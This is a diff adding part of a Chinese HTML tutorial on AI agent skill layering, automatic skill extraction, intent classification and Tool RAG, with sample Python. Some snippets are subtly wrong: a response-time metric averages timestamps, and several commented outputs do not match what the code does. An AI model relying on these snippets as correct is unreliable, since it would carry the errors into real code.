+    "keywords": ["搜", "查", "查询"]
+}
+
+l0_python_exec_skill = {
+    "layer": "L0",
+    "name": "python_exec",
+    "description": "在沙箱中执行Python代码",
+    "tools": ["python_sandbox"],      # 单工具
+    "prompt": "执行以下Python代码:\n{code}\n返回stdout输出。",
+    "intent_types": ["代码执行"],
+    "keywords": ["执行", "运行", "计算"]
+}
+
+# ===== L1 组合层：工作流编排 =====
+l1_code_review_skill = {
+    "layer": "L1",
+    "name": "code_review_flow",
+    "description": "完整代码审查流程：读取代码→分析风格→检查漏洞→生成报告",
+    "tools": ["read_file", "python_sandbox", "search_engine"],  # 组合多个L0工具
+    "prompt": """按以下步骤执行代码审查:
+      1. 调用 file_read 读取代码文件
+      2. 调用 python_exec 运行静态分析
+      3. 调用 web_search 搜索已知漏洞模式
+      4. 综合分析，生成审查报告""",
+    "flow": ["file_read", "python_exec", "web_search", "generate_report"],
+    "intent_types": ["代码执行", "文件操作"],
+    "keywords": ["审查", "review", "检查代码"]
+}
+
+l1_deploy_skill = {
+    "layer": "L1",
+    "name": "deploy_flow",
+    "description": "部署发布流程：构建→测试→推送→通知",
+    "tools": ["shell_exec", "python_sandbox", "slack_notify"],
+    "prompt": """按以下步骤执行部署:
+      1. 调用 shell_exec 构建项目
+      2. 调用 python_exec 运行测试
+      3. 调用 shell_exec 推送到生产环境
+      4. 调用 slack_notify 通知团队""",
+    "flow": ["build", "test", "push", "notify"],
+    "intent_types": ["代码执行", "通信交互"],
+    "keywords": ["部署", "发布", "上线"]
+}
+
+# ===== L2 业务层：领域专家 =====
+l2_financial_compliance_skill = {
+    "layer": "L2",
+    "name": "financial_compliance_review",
+    "description": "金融合规审查：条款检索→风险评估→合规判断→整改建议",
+    "skills": ["code_review_flow", "deploy_flow"],  # 调用L1组合层流程
+    "prompt": """你是一位金融合规审查专家。请对以下内容执行合规审查:
+      1. 调用 code_review_flow 检查代码规范
+      2. 检查是否符合金融监管要求
+      3. 评估风险等级
+      4. 输出合规结论和整改建议""",
+    "intent_types": ["信息获取", "代码执行"],
+    "keywords": ["合规", "审查", "金融", "风控"]
+}
+
+l2_legal_review_skill = {
+    "layer": "L2",
+    "name": "legal_compliance_review",
+    "description": "法律合规审查：条款检索→法律风险评估→整改建议生成",
+    "skills": ["code_review_flow"],  # 调用L1流程
+    "prompt": """你是一位法律合规审查专家。请执行以下审查:
+      1. 调用 code_review_flow 审查文档条款
+      2. 评估法律风险
+      3. 生成合规建议""",
+    "intent_types": ["信息获取"],
+    "keywords": ["法律", "合规", "条款", "风险"]
+}</pre>
+</div>
+
+<div class="quote">
+  Skill 分层的核心原则：<strong>L0 做一件事，L1 编排流程，L2 理解业务</strong>。上层调用下层，下层不知道上层存在。这样修改L0原子操作时，只需要确保接口不变，上层自动兼容。
+</div>
+
+<!-- ===== 5.9 Skill沉淀机制 ===== -->
+<h2 class="section-heading">5.9 Skill 沉淀机制</h2>
+
+<p>Skill 是系统自动沉淀，还是只能用户手动构造？答案是<strong>三者皆有</strong>，各有适用场景。</p>
+
+<div class="card">
+  <div class="card-title">🔄 Skill 沉淀的三种方式</div>
+  <div style="margin-top: 16px;">
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-info); margin-bottom: 12px;
+         background: linear-gradient(to right, var(--color-bg-tertiary), transparent);">
+      <strong style="color: var(--color-info);">① 自动沉淀</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">Agent 执行成功后，将操作序列提取为 Skill 模板。系统监控任务执行模式，当<strong>同一类任务执行3次以上且成功率>80%</strong>时，自动触发沉淀流程。</p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-secondary); border-radius: 4px;">
+        沉淀流程：操作序列 → 模式提取 → 参数泛化 → Skill注册 → 版本标记
+      </div>
+    </div>
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-accent); margin-bottom: 12px;
+         background: linear-gradient(to right, var(--color-bg-tertiary), transparent);">
+      <strong style="color: var(--color-accent);">② 半自动沉淀</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">用户标记"这段操作值得沉淀" → 系统辅助提炼：提取操作序列、识别可泛化参数、生成Skill定义草稿，用户确认后正式注册。</p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-secondary); border-radius: 4px;">
+        适用：操作模式未达到3次阈值，但用户认为有复用价值
+      </div>
+    </div>
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-warning);
+         background: linear-gradient(to right, var(--color-bg-tertiary), transparent);">
+      <strong style="color: var(--color-warning);">③ 手动构造</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">开发者显式编写 Skill 定义文件（当前主流方式）：指定工具列表、Prompt模板、执行流程、意图类型和关键词。最可控，质量最高。</p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-secondary); border-radius: 4px;">
+        适用：新领域首次构建、高质量要求、精细控制场景
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<h3 class="sub-heading">自动沉淀触发条件与流程</h3>
+
+<div class="flowchart-container" id="skillPrecipitateFlow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('skillPrecipitateFlow', {
+    nodes: [
+      { id: 'task', label: '任务执行\n记录操作序列', type: 'start' },
+      { id: 'count', label: '同类任务\n执行次数≥3？', type: 'decision' },
+      { id: 'rate', label: '成功率\n>80%？', type: 'decision' },
+      { id: 'extract', label: '模式提取\n识别操作模式', type: 'process' },
+      { id: 'generalize', label: '参数泛化\n具体值→参数变量', type: 'process' },
+      { id: 'register', label: 'Skill注册\n写入注册表+版本号', type: 'process' },
+      { id: 'skip', label: '继续监控\n不满足沉淀条件', type: 'end' },
+      { id: 'done', label: '新Skill可用\n后续请求可匹配', type: 'end' }
+    ],
+    edges: [
+      { from: 'task', to: 'count' },
+      { from: 'count', to: 'rate', label: '≥3次' },
+      { from: 'count', to: 'skip', label: '<3次' },
+      { from: 'rate', to: 'extract', label: '>80%' },
+      { from: 'rate', to: 'skip', label: '<80%' },
+      { from: 'extract', to: 'generalize' },
+      { from: 'generalize', to: 'register' },
+      { from: 'register', to: 'done' }
+    ],
+    animate: true
+  });
+}, 300);
+</script>
+
+<h3 class="sub-heading">Skill 版本管理与质量评估</h3>
+
+<div class="card">
+  <div style="margin-top: 16px;">
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-info); margin-bottom: 12px;">
+      <strong style="color: var(--color-info);">版本管理</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">Skill 也需要版本号（如 v1.0.0 → v1.1.0 → v2.0.0）和变更日志。版本号遵循语义化版本规则：<strong>主版本</strong>（不兼容变更）、<strong>次版本</strong>（新增功能）、<strong>修订号</strong>（Bug修复）。</p>
+    </div>
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">质量评估三维度</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">① <strong>成功率</strong>：Skill 执行成功次数 / 总调用次数。低于 70% 应标记为低质量。</p>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 4px 0;">② <strong>响应时间</strong>：Skill 平均执行耗时。超过 30s 应优化流程。</p>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 4px 0;">③ <strong>用户满意度</strong>：基于用户反馈（点赞/踩、复用率）。持续低于 50% 应考虑淘汰。</p>
+    </div>
+  </div>
+</div>
+
+<div class="code-block">
+  <span class="code-label">Skill 自动沉淀引擎</span>
+<pre>import hashlib
+import json
+from typing import List, Dict, Optional
+from dataclasses import dataclass, field
+from datetime import datetime
+
+@dataclass
+class TaskExecution:
+    """一次任务执行记录"""
+    task_type: str              # 任务类别（如"邮件发送""天气查询"）
+    user_input: str             # 用户原始输入
+    operation_sequence: List[Dict]  # 操作序列 [{tool, args, result}]
+    success: bool               # 是否成功完成
+    timestamp: datetime         # 执行时间
+    user_feedback: Optional[str] = None  # 用户反馈
+
+@dataclass
+class SkillDefinition:
+    """沉淀出的 Skill 定义"""
+    skill_id: str
+    name: str
+    description: str
+    layer: str                  # L0/L1/L2
+    tools: List[str]
+    prompt_template: str
+    flow: List[str]
+    intent_types: List[str]
+    keywords: List[str]
+    version: str = "1.0.0"
+    changelog: List[str] = field(default_factory=list)
+    source: str = "auto"        # auto / semi / manual
+    quality_metrics: Dict = field(default_factory=dict)
+
+class SkillPrecipitationEngine:
+    """Skill 自动沉淀引擎"""
+
+    MIN_EXECUTIONS = 3          # 最少执行次数阈值
+    MIN_SUCCESS_RATE = 0.80     # 最低成功率阈值
+
+    def __init__(self):
+        self.execution_history: Dict[str, List[TaskExecution]] = {}  # task_type → 执行列表
+        self.precipitated_skills: Dict[str, SkillDefinition] = {}    # skill_id → Skill
+
+    def record_execution(self, execution: TaskExecution):
+        """记录一次任务执行"""
+        if execution.task_type not in self.execution_history:
+            self.execution_history[execution.task_type] = []
+        self.execution_history[execution.task_type].append(execution)
+
+        # 每次记录后检查是否满足沉淀条件
+        self._check_precipitation(execution.task_type)
+
+    def _check_precipitation(self, task_type: str):
+        """检查是否满足自动沉淀条件"""
+        history = self.execution_history[task_type]
+
+        # ① 执行次数 ≥ 3
+        if len(history) < self.MIN_EXECUTIONS:
+            return
+
+        # ② 成功率 > 80%
+        success_count = sum(1 for h in history if h.success)
+        success_rate = success_count / len(history)
+        if success_rate < self.MIN_SUCCESS_RATE:
+            return
+
+        # ✅ 满足条件 → 触发沉淀流程
+        print(f"[沉淀触发] 任务类型 '{task_type}' 执行{len(history)}次, 成功率{success_rate:.0%}")
+        new_skill = self._precipitate(task_type, history)
+        self.precipitated_skills[new_skill.skill_id] = new_skill
+
+    def _precipitate(self, task_type: str, history: List[TaskExecution]) -> SkillDefinition:
+        """沉淀流程：模式提取 → 参数泛化 → Skill注册"""
+
+        # ① 模式提取：分析操作序列的共同模式
+        common_ops = self._extract_common_pattern(history)
+
+        # ② 参数泛化：把具体值替换为参数变量
+        generalized_flow = self._generalize_parameters(common_ops)
+
+        # ③ 生成 Skill 定义
+        skill_id = f"auto_{task_type}_{hashlib.md5(task_type.encode()).hexdigest()[:8]}"
+        skill_name = f"auto_{task_type}_skill"
+        description = self._generate_description(task_type, common_ops)
+
+        new_skill = SkillDefinition(
+            skill_id=skill_id,
+            name=skill_name,
+            description=description,
+            layer=self._determine_layer(common_ops),
+            tools=[op["tool"] for op in common_ops],
+            prompt_template=self._build_prompt(task_type, generalized_flow),
+            flow=[op["tool"] for op in common_ops],
+            intent_types=self._infer_intent_types(history),
+            keywords=self._extract_keywords(history),
+            version="1.0.0",
+            changelog=[f"v1.0.0: 自动沉淀于 {datetime.now().strftime('%Y-%m-%d')}"],
+            source="auto",
+            quality_metrics={
+                "success_rate": sum(1 for h in history if h.success) / len(history),
+                "avg_response_time": sum(h.timestamp.timestamp() for h in history) / len(history),
+                "execution_count": len(history)
+            }
+        )
+        return new_skill
+
+    def _extract_common_pattern(self, history: List[TaskExecution]) -> List[Dict]:
+        """模式提取：找出多次执行中共同的操作序列"""
+        # 取所有成功执行的操作序列
+        successful_seqs = [h.operation_sequence for h in history if h.success]
+        # 找出最长公共子序列作为模式
+        if not successful_seqs:
+            return []
+        pattern = successful_seqs[0]  # 简化：以第一次成功序列为基准
+        return pattern
+
+    def _generalize_parameters(self, pattern: List[Dict]) -> List[Dict]:
+        """参数泛化：把具体值替换为参数变量"""
+        generalized = []
+        for op in pattern:
+            gen_args = {}
+            for key, value in op.get("args", {}).items():
+                # 具体值 → 参数占位符
+                gen_args[key] = f"{{{key}}}"  # 如 "北京" → {city}
+            generalized.append({"tool": op["tool"], "args_template": gen_args})
+        return generalized
+
+    def _determine_layer(self, pattern: List[Dict]) -> str:
+        """根据操作数和复杂度判断层级"""
+        if len(pattern) == 1:
+            return "L0"   # 单操作 → 基础层
+        elif len(pattern) <= 4:
+            return "L1"   # 流程编排 → 组合层
+        else:
+            return "L2"   # 复杂业务 → 业务层
+
+    def _infer_intent_types(self, history: List[TaskExecution]) -> List[str]:
+        """从历史输入推断意图类型"""
+        # 简化：基于关键词推断
+        all_inputs = " ".join([h.user_input for h in history])
+        intent_map = {
+            "信息获取": ["查", "看", "搜索", "了解"],
+            "代码执行": ["算", "运行", "执行", "分析"],
+            "文件操作": ["保存", "读取", "修改", "导出"],
+            "通信交互": ["发", "通知", "推送", "发送"]
+        }
+        types = []
+        for intent, kws in intent_map.items():
+            if any(kw in all_inputs for kw in kws):
+                types.append(intent)
+        return types or ["信息获取"]
+
+    def _extract_keywords(self, history: List[TaskExecution]) -> List[str]:
+        """从历史输入提取触发关键词"""
+        # 简化：取高频词
+        all_words = " ".join([h.user_input for h in history]).split()
+        word_freq = {}
+        for w in all_words:
+            word_freq[w] = word_freq.get(w, 0) + 1
+        # 取频率≥2的关键词
+        return [w for w, f in word_freq.items() if f >= 2][:5]
+
+    def _generate_description(self, task_type: str, pattern: List[Dict]) -> str:
+        """生成 Skill 描述"""
+        tools = ", ".join([op["tool"] for op in pattern])
+        return f"自动沉淀的{task_type}技能，包含工具: {tools}"
+
+    def _build_prompt(self, task_type: str, flow: List[Dict]) -> str:
+        """构建 Skill Prompt 模板"""
+        steps = []
+        for i, op in enumerate(flow):
+            args = ", ".join([f"{k}={v}" for k, v in op.get("args_template", {}).items()])
+            steps.append(f"  {i+1}. 调用 {op['tool']}({args})")
+        return f"执行{task_type}任务:\n" + "\n".join(steps)
+
+# ===== 使用示例 =====
+engine = SkillPrecipitationEngine()
+
+# 记录3次邮件发送任务
+engine.record_execution(TaskExecution(
+    task_type="邮件发送", user_input="帮我给张三发邮件",
+    operation_sequence=[
+        {"tool": "search_contacts", "args": {"name": "张三"}, "result": "zhangsan@company.com"},
+        {"tool": "draft_email", "args": {"to": "zhangsan@company.com"}, "result": "草稿完成"},
+        {"tool": "smtp_send", "args": {"to": "zhangsan@company.com"}, "result": "发送成功"}
+    ], success=True, timestamp=datetime.now()
+))
+engine.record_execution(TaskExecution(
+    task_type="邮件发送", user_input="通知李四明天开会",
+    operation_sequence=[
+        {"tool": "search_contacts", "args": {"name": "李四"}, "result": "lisi@company.com"},
+        {"tool": "draft_email", "args": {"to": "lisi@company.com"}, "result": "草稿完成"},
+        {"tool": "smtp_send", "args": {"to": "lisi@company.com"}, "result": "发送成功"}
+    ], success=True, timestamp=datetime.now()
+))
+engine.record_execution(TaskExecution(
+    task_type="邮件发送", user_input="给王五发项目进度邮件",
+    operation_sequence=[
+        {"tool": "search_contacts", "args": {"name": "王五"}, "result": "wangwu@company.com"},
+        {"tool": "draft_email", "args": {"to": "wangwu@company.com"}, "result": "草稿完成"},
+        {"tool": "smtp_send", "args": {"to": "wangwu@company.com"}, "result": "发送成功"}
+    ], success=True, timestamp=datetime.now()
+))
+
+# 第3次执行后 → 自动沉淀触发
+# [沉淀触发] 任务类型 '邮件发送' 执行3次, 成功率100%
+# → 模式提取: search_contacts → draft_email → smtp_send
+# → 参数泛化: {name} → {to} → {to}
+# → Skill注册: auto_email_send_skill v1.0.0
+
+print(f"已沉淀Skill数: {len(engine.precipitated_skills)}")
+for sid, skill in engine.precipitated_skills.items():
+    print(f"  {sid}: {skill.name} (v{skill.version}, {skill.layer})")
+    print(f"    成功率: {skill.quality_metrics['success_rate']:.0%}")</pre>
+</div>
+
+<div class="quote">
+  Skill 沉淀是 Agent 从"用工具"到"有技能"的关键跨越。自动沉淀让系统<strong>越用越聪明</strong>——反复成功的操作模式自动固化为可复用Skill。但3次+80%的阈值是<strong>防止低质量沉淀</strong>的底线保障。
+</div>
+
+<!-- ===== 5.10 意图识别与工具路由 ===== -->
+<h2 class="section-heading">5.10 意图识别与工具路由</h2>
+
+<p>用户说"帮我查下北京天气"，Agent 需要先理解<strong>用户到底想做什么</strong>，才能选到正确的工具。这就是意图识别——工具路由的"大脑"。</p>
+
+<h3 class="sub-heading">意图分类体系</h3>
+
+<div class="card">
+  <div class="card-title">🧠 四类意图 → 四类工具</div>
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px;">
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">🔍 信息获取意图</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        用户想<strong>知道某件事</strong>。关键词：查、看、了解、搜索、查询。
+      </p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-tertiary); border-radius: 4px;">
+        例："北京天气怎么样" → 搜索/天气API<br>
+        例："最新的AI论文有哪些" → 搜索工具
+      </div>
+    </div>
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">⚙️ 代码执行意图</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        用户想<strong>运行代码做计算</strong>。关键词：算、运行、执行、分析、处理。
+      </p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-tertiary); border-radius: 4px;">
+        例："用Python画个饼图" → Python沙箱<br>
+        例："计算这组数据的标准差" → 代码执行工具
+      </div>
+    </div>
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">📝 文件操作意图</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        用户想<strong>读写操作文件</strong>。关键词：保存、读取、修改、创建、导出。
+      </p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-tertiary); border-radius: 4px;">
+        例："把结果保存为CSV" → 文件写入工具<br>
+        例："读取这份PDF的内容" → PDF解析工具
+      </div>
+    </div>
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-warning);">
+      <strong style="color: var(--color-warning);">🌐 通信交互意图</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        用户想<strong>发送消息或调用服务</strong>。关键词：发、通知、推送、提交、调用。
+      </p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-tertiary); border-radius: 4px;">
+        例："给张三发邮件" → 邮件工具<br>
+        例："推送消息到Slack" → Slack API工具
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<h3 class="sub-heading">隐式意图识别</h3>
+
+<p>用户不会总是明确说"我要搜索"或"我要执行代码"。很多请求是<strong>隐式的</strong>：</p>
+
+<div class="card">
+  <div style="margin-top: 12px;">
+    <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+      <thead>
+        <tr style="border-bottom: 2px solid var(--color-border);">
+          <th style="text-align: left; padding: 8px; color: var(--color-text-secondary);">用户说</th>
+          <th style="text-align: left; padding: 8px; color: var(--color-text-secondary);">表面意思</th>
+          <th style="text-align: left; padding: 8px; color: var(--color-info);">隐式意图</th>
+          <th style="text-align: left; padding: 8px; color: var(--color-accent);">应选工具</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;">"帮我查下北京天气"</td>
+          <td style="padding: 8px; color: var(--color-text-secondary);">查询天气</td>
+          <td style="padding: 8px; color: var(--color-info);">信息获取</td>
+          <td style="padding: 8px; color: var(--color-accent);">天气API / 搜索</td>
+        </tr>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;">"这个数据有什么规律"</td>
+          <td style="padding: 8px; color: var(--color-text-secondary);">分析数据</td>
+          <td style="padding: 8px; color: var(--color-info);">代码执行</td>
+          <td style="padding: 8px; color: var(--color-accent);">Python沙箱</td>
+        </tr>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;">"把这个报告存下来"</td>
+          <td style="padding: 8px; color: var(--color-text-secondary);">保存文件</td>
+          <td style="padding: 8px; color: var(--color-info);">文件操作</td>
+          <td style="padding: 8px; color: var(--color-accent);">文件写入</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px;">"提醒团队下午开会"</td>
+          <td style="padding: 8px; color: var(--color-text-secondary);">通知</td>
+          <td style="padding: 8px; color: var(--color-info);">通信交互</td>
+          <td style="padding: 8px; color: var(--color-accent);">Slack / 邮件</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="quote">
+  意图识别的核心不是关键词匹配，而是理解用户<strong>想达成的目标</strong>。"查天气"和"外面冷不冷"表面完全不同，但意图相同。
+</div>
+
+<h3 class="sub-heading">复合意图拆解</h3>
+
+<p>很多用户请求包含<strong>多个意图</strong>，需要拆解后依次或并行执行：</p>
+
+<div class="flowchart-container" id="compositeIntent"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('compositeIntent', {
+    nodes: [
+      { id: 'input', label: '复合请求\n"帮我搜索并用\nPython分析数据"', type: 'start' },
+      { id: 'parse', label: '意图拆解', type: 'process' },
+      { id: 'intent1', label: '意图①\n信息获取', type: 'process' },
+      { id: 'intent2', label: '意图②\n代码执行', type: 'process' },
+      { id: 'tool1', label: '搜索工具', type: 'tool' },
+      { id: 'tool2', label: 'Python沙箱', type: 'tool' },
+      { id: 'merge', label: '合并结果\n生成回答', type: 'process' },
+      { id: 'output', label: '返回用户', type: 'end' }
+    ],
+    edges: [
+      { from: 'input', to: 'parse' },
+      { from: 'parse', to: 'intent1' },
+      { from: 'parse', to: 'intent2' },
+      { from: 'intent1', to: 'tool1' },
+      { from: 'intent2', to: 'tool2', label: '依赖①的结果' },
+      { from: 'tool1', to: 'merge' },
+      { from: 'tool2', to: 'merge' },
+      { from: 'merge', to: 'output' }
+    ],
+    animate: true
+  });
+}, 300);
+</script>
+
+<div class="code-block">
+  <span class="code-label">意图识别与复合意图拆解代码</span>
+<pre>from enum import Enum
+from dataclasses import dataclass
+from typing import List
+
+class IntentType(Enum):
+    INFO_QUERY = "信息获取"      # 搜索、查询、获取
+    CODE_EXEC = "代码执行"       # 计算、分析、运行
+    FILE_OP = "文件操作"         # 读写、保存、导出
+    COMM_INTERACT = "通信交互"   # 发送、通知、推送
+
+@dataclass
+class Intent:
+    type: IntentType
+    original_text: str        # 原始用户表述
+    target: str               # 具体目标（如"北京天气"）
+    priority: int = 0         # 执行优先级，0最高
+    depends_on: List[str] = None  # 依赖的前置意图ID
+
+# 意图分类器 —— 可用LLM或轻量模型实现
+INTENT_KEYWORDS = {
+    IntentType.INFO_QUERY: ["查", "看", "搜索", "查询", "了解", "什么", "多少", "怎样"],
+    IntentType.CODE_EXEC:  ["算", "运行", "执行", "分析", "处理", "画", "计算", "统计"],
+    IntentType.FILE_OP:    ["保存", "读取", "修改", "创建", "导出", "写入", "下载"],
+    IntentType.COMM_INTERACT: ["发", "通知", "推送", "提交", "发送", "提醒", "转发"],
+}
+
+def classify_intent(user_input: str) -> List[Intent]:
+    """识别意图，支持复合意图拆解"""
+    intents = []
+    
+    # 简单关键词匹配 → 生产环境应替换为LLM意图分类
+    # 复合请求检测：包含"并""然后""再"等连接词
+    sub_requests = split_composite_request(user_input)
+    
+    for sub in sub_requests:
+        matched_type = None
+        for intent_type, keywords in INTENT_KEYWORDS.items():
+            if any(kw in sub for kw in keywords):
+                matched_type = intent_type
+                break
+        if matched_type:
+            intents.append(Intent(
+                type=matched_type,
+                original_text=sub,
+                target=extract_target(sub)
+            ))
+    
+    # 设置依赖关系：后置意图可能依赖前置意图的结果
+    for i in range(1, len(intents)):
+        if intents[i].type == IntentType.CODE_EXEC and intents[i-1].type == IntentType.INFO_QUERY:
+            intents[i].depends_on = [intents[i-1].original_text]
+    
+    return intents
+
+def split_composite_request(text: str) -> List[str]:
+    """拆解复合请求"""
+    connectors = ["并", "然后", "再", "接着", "以及", "而且"]
+    for conn in connectors:
+        if conn in text:
+            parts = text.split(conn, 1)
+            return [p.strip() for p in parts if p.strip()]
+    return [text]
+
+def extract_target(text: str) -> str:
+    """提取意图目标（简化版）"""
+    # 去掉意图关键词，保留核心内容
+    for keywords in INTENT_KEYWORDS.values():
+        for kw in keywords:
+            if kw in text:
+                return text.replace(kw, "").strip()
+    return text
+
+# 意图 → 工具映射
+INTENT_TOOL_MAP = {
+    IntentType.INFO_QUERY: ["web_search", "weather_api", "news_api", "knowledge_base"],
+    IntentType.CODE_EXEC:  ["python_executor", "sql_executor", "js_runtime"],
+    IntentType.FILE_OP:    ["file_read", "file_write", "pdf_parser", "csv_handler"],
+    IntentType.COMM_INTERACT: ["send_email", "slack_notify", "webhook_call"],
+}
+
+def route_to_tools(intents: List[Intent]) -> List[str]:
+    """意图 → 工具名称映射"""
+    candidate_tools = []
+    for intent in intents:
+        candidate_tools.extend(INTENT_TOOL_MAP.get(intent.type, []))
+    return candidate_tools
+
+# ===== 使用示例 =====
+user_request = "帮我搜索最新的AI论文并用Python分析引用趋势"
+intents = classify_intent(user_request)
+
+for i, intent in enumerate(intents):
+    print(f"意图{i+1}: {intent.type.value} | 目标: {intent.target}")
+    if intent.depends_on:
+        print(f"  ⚠️ 依赖前置结果: {intent.depends_on}")
+
+# 输出:
+# 意图1: 信息获取 | 目标: 最新的AI论文
+# 意图2: 代码执行 | 目标: 分析引用趋势
+#   ⚠️ 依赖前置结果: ['最新的AI论文']
+
+tools = route_to_tools(intents)
+print(f"候选工具: {tools}")
+# 输出: 候选工具: ['web_search', 'weather_api', ..., 'python_executor', ...]</pre>
+</div>
+
+<!-- ===== 5.11 上下文工程与工具管理 ===== -->
+<h2 class="section-heading">5.11 上下文工程与工具管理</h2>
+
+<p>一个 Agent 可能注册了 50 个工具。如果把所有工具描述一次性塞给 LLM，每次请求都要消耗数千 token 在工具描述上——而 LLM 实际只会用到 1~3 个。这就是<strong>上下文工程</strong>要解决的问题。</p>
+
+<div class="quote">
+  上下文工程的核心原则：给 LLM <strong>刚好够用</strong>的信息，不多不少。过载的上下文和空白的上下文一样致命。
+</div>
+
+<h3 class="sub-heading">JIT Context 加载工具描述</h3>
+
+<p><strong>JIT（Just-In-Time）</strong>策略：不一次性加载所有工具描述，只在需要时才动态加载相关的工具。</p>
+
+<div class="compare-animation">
+  <div class="compare-side left">
+    <div class="side-label">全量加载（传统方式）</div>
+    <div class="side-content">
+      <div class="highlight-line">每次请求传入全部50个工具</div>
+      <div class="highlight-line">工具描述 ≈ 5000 tokens</div>
+      <div class="highlight-line">LLM 需遍历所有工具描述</div>
+      <div class="highlight-line">准确率随工具数增多而下降</div>
+      <div class="highlight-line" style="color: var(--color-error);">❌ 浪费 token + 干扰选择</div>
+    </div>
+  </div>
+  <div class="compare-side right">
+    <div class="side-label">JIT 加载（上下文工程）</div>
+    <div class="side-content">
+      <div class="highlight-line">按意图只加载相关3~5个工具</div>
+      <div class="highlight-line">工具描述 ≈ 300 tokens</div>
+      <div class="highlight-line">LLM 聚焦于少量候选工具</div>
+      <div class="highlight-line">准确率更高，响应更快</div>
+      <div class="highlight-line" style="color: var(--color-success);">✅ 精准 + 高效</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">Tool RAG：工具检索策略</h3>
+
+<p>与文档 RAG 类似，Tool RAG 把工具描述做 embedding 存入向量库，请求来时检索最相关的 Top-K：</p>
+
+<div class="code-block">
+  <span class="code-label">Tool RAG 检索实现</span>
+<pre>import numpy as np
+from typing import List, Dict
+
+class ToolRAG:
+    """工具描述的向量检索系统"""
+    
+    def __init__(self, embedding_model, tools: List[Dict]):
+        self.embedding_model = embedding_model
+        self.tools = tools
+        # 将工具描述做 embedding
+        self.tool_embeddings = []
+        self.tool_texts = []
+        for tool in tools:
+            desc = self._build_search_text(tool)
+            emb = embedding_model.encode(desc)
+            self.tool_embeddings.append(emb)
+            self.tool_texts.append(desc)
+        self.tool_embeddings = np.array(self.tool_embeddings)
+    
+    def _build_search_text(self, tool: Dict) -> str:
+        """构建工具的可搜索文本：名称+描述+参数摘要"""
+        func = tool["function"]
+        text = f"{func['name']}: {func['description']}"
+        if "parameters" in func:
+            props = func["parameters"].get("properties", {})
+            for pname, pinfo in props.items():
+                text += f" | 参数{pname}({pinfo.get('type','')}): {pinfo.get('description','')}"
+        return text
+    
+    def retrieve(self, user_query: str, top_k: int = 5) -> List[Dict]:
+        """根据用户请求检索最相关的 Top-K 工具"""
+        query_emb = self.embedding_model.encode(user_query)
+        # cosine 相似度
+        similarities = np.dot(self.tool_embeddings, query_emb) / \
+            (np.linalg.norm(self.tool_embeddings, axis=1) * np.linalg.norm(query_emb))
+        top_indices = np.argsort(similarities)[-top_k:][::-1]
+        return [self.tools[i] for i in top_indices]
+
+# ===== 使用示例 =====
+tool_rag = ToolRAG(embedding_model=my_encoder, tools=all_50_tools)
+
+# 用户请求来了
+user_query = "帮我查下北京明天的天气"
+relevant_tools = tool_rag.retrieve(user_query, top_k=3)
+# 返回: [get_weather, web_search, news_api]
+
+# 只把相关工具传给 LLM
+response = openai.chat.completions.create(
+    model="gpt-4o",
+    messages=[{"role": "user", "content": user_query}],
+    tools=relevant_tools  # ← 只传3个，而非全部50个
+)</pre>
+</div>
+
+<h3 class="sub-heading">工具描述优化：高信号低噪声</h3>
+
